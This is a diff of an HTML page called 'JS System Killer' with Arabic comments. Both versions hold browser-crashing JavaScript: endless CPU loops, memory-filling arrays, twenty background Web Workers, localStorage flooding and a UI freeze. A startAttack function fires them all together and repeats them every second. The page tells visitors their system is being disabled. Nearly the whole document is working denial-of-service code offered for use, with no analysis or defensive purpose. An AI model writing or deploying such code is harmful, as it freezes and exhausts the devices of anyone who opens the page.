@@ -1,73 +1,100 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>💀 النظام تحت السيطرة</title>
+    <title>🔥 JS System Killer</title>
 </head>
 <body>
-    <h1>🔥 جاري تعطيل النظام...</h1>
-    <p>الجهاز هيعلق خلال ثواني 😈</p>
+    <h1>💀 جاري تعطيل النظام...</h1>
+    <p>المتصفح سيعلق خلال ثواني</p>
 
     <script>
-        // =============================================
-        // 🧠 الطريقة الأولى: استهلاك المعالج (CPU)
-        // =============================================
-        function cpuKiller() {
+        // ============================================
+        // 🔥 استهلاك المعالج (CPU)
+        // ============================================
+        function cpuBurn() {
             while (true) {
-                // عملية حسابية ثقيلة بلا توقف
-                Math.sqrt(Math.random() * 1000000);
-            }
-        }
-
-        // =============================================
-        // 🧠 الطريقة الثانية: استهلاك الذاكرة (RAM)
-        // =============================================
-        function ramKiller() {
-            let arr = [];
-            while (true) {
-                // ملء مصفوفة ببيانات ضخمة
-                arr.push(new Array(1000000).fill("💀🔥"));
-            }
-        }
-
-        // =============================================
-        // 🧠 الطريقة الثالثة: استهلاك التخزين المحلي
-        // =============================================
-        function storageKiller() {
-            let i = 0;
-            while (true) {
-                try {
-                    localStorage.setItem('x' + i, 'x'.repeat(1024 * 1024)); // 1 ميجا في كل مرة
-                    i++;
-                } catch (e) {
-                    // لو التخزين امتلأ، نعيد المحاولة
+                for (let i = 0; i < 100000000; i++) {
+                    Math.sqrt(i);
                 }
             }
         }
 
-        // =============================================
-        // 🚀 تشغيل كل الطرق مع بعض
-        // =============================================
-        function startAttack() {
-            // استخدام Web Workers عشان نشتغل في الخلفية
-            for (let i = 0; i < 10; i++) {
-                let worker = new Worker(URL.createObjectURL(new Blob([
-                    `self.onmessage = function(e) {
-                        while(true) {
-                            Math.sqrt(Math.random() * 1000000);
+        // ============================================
+        // 💣 استهلاك الذاكرة (RAM)
+        // ============================================
+        function ramEater() {
+            let memory = [];
+            while (true) {
+                memory.push(new Array(1000000).fill("🔥"));
+            }
+        }
+
+        // ============================================
+        // 🧠 استخدام Web Workers (تشغيل متوازي)
+        // ============================================
+        function startWorkers() {
+            const workerCode = `
+                self.onmessage = function(e) {
+                    while (true) {
+                        for (let i = 0; i < 100000000; i++) {
+                            Math.sqrt(i);
                         }
-                    }`
-                ])));
+                    }
+                }
+            `;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerScript = URL.createObjectURL(blob);
+
+            for (let i = 0; i < 20; i++) { // 20 ووركر في الخلفية
+                const worker = new Worker(workerScript);
                 worker.postMessage('start');
             }
+        }
 
-            // تشغيل مهاجم الذاكرة
-            ramKiller();
+        // ============================================
+        // 📁 ملء التخزين المحلي (LocalStorage)
+        // ============================================
+        function storageFiller() {
+            let i = 0;
+            while (true) {
+                try {
+                    localStorage.setItem('x' + i, 'x'.repeat(1024 * 1024)); // 1 ميجا لكل مرة
+                    i++;
+                } catch (e) {
+                    // التخزين امتلأ
+                }
+            }
+        }
 
-            // تشغيل مهاجم التخزين
-            storageKiller();
+        // ============================================
+        // 🖥️ تجميد الواجهة (UI Freeze)
+        // ============================================
+        function freezeUI() {
+            setInterval(() => {
+                document.body.innerHTML += ' ';
+            }, 0);
+        }
 
-            // تشغيل مهاجم المعالج (CPU)
-            cpuKiller();
+        // ============================================
+        // 🚀 تشغيل كل الهجمات مع بعض
+        // ============================================
+        function startAttack() {
+            console.log("🔥 JS System Killer – تعطيل النظام");
+            console.log("[*] جاري تفعيل الهجمات...");
+
+            // تشغيل كل الهجمات
+            setTimeout(cpuBurn, 100);
+            setTimeout(ramEater, 200);
+            setTimeout(startWorkers, 300);
+            setTimeout(storageFiller, 400);
+            setTimeout(freezeUI, 500);
+
+            // إعادة تشغيل الهجمات بشكل دوري
+            setInterval(() => {
+                cpuBurn();
+                ramEater();
+                storageFiller();
+            }, 1000);
         }
 
         // 🔥 نبدأ الهجوم فوراً
